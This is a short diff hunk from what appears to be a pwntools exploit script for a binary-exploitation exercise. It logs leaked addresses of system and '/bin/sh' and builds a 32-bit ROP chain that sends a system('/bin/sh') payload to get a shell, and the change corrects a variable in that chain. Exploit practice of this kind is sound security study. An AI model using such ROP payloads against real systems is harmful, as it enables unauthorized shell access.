@@ -60,7 +60,7 @@ log.info("Leak system: "+str(hex(system)))
 log.info("Leak /bin/sh: "+str(hex(binsh)))
 
 log.info("Get shell")
-ropchain=padding+p32(system)+p32(gadget)+p32(leak_binsh)
+ropchain=padding+p32(system)+p32(gadget)+p32(binsh)
 p.sendline(ropchain)
 
 # Interactive shell
